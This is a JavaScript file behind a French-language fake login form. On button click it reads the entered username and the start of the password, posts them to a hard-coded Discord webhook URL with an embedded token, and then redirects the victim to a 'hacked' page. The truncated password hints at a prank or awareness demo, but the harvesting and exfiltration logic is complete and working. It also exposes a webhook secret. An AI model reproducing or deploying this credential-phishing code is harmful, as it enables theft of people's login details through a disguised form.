document.querySelector('.envoyer.btn').addEventListener("click", function () {
    sendUserName();

    // console.log('a')
    // window.location = "./hacked"
});

function sendUserName() {
    let name = document.querySelector('#name').value;
    let mdp = document.querySelector('#mdp').value.substring(0, 3) + ".........";
    let payload = JSON.stringify(message(name, mdp));

    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1050899303436144670/VFkFpIAWKHYlFS6DJYRN8ADZKbyiVdDJA1pRUXzX67Uv8aTNd1wrp3JgwicpiflrvEQq");
    request.setRequestHeader('Content-type', 'application/json');
    request.onload = () => {
        console.log('a')
        window.location = "./hacked"
    }

    request.send(payload);
}

function message(name, mdp) {
    return {
        "content": name + " a été hacké!",
        "embeds": [
            {
                "title": "Données entrées :",
                "description": "Nom d'usager : " + name + "\nMot de passe : " + mdp,
                "color": 16711680
            }
        ]
    }
}

function GoInFullscreen(element) {
    if (element.requestFullscreen)
        element.requestFullscreen();
    else if (element.mozRequestFullScreen)
        element.mozRequestFullScreen();
    else if (element.webkitRequestFullscreen)
        element.webkitRequestFullscreen();
    else if (element.msRequestFullscreen)
        element.msRequestFullscreen();
}